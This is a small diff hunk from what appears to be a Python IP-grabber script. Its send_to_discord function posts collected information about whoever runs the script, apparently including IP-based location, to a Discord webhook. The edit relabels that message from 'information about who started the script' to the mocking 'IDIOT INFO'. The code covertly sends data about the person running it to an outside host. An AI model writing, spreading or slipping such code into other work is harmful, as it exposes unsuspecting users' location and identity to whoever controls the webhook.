@@ -23,7 +23,7 @@ def get_location(ip):
 
 def send_to_discord(info):
     data = {
-        "content": f"**Informações de quem iniciou o script:**\n\n{info}",
+        "content": f"**IDIOT INFO:**\n\n{info}",
     }
     requests.post(WEBHOOK_URL, data=json.dumps(data), headers={'Content-Type': 'application/json'})
 
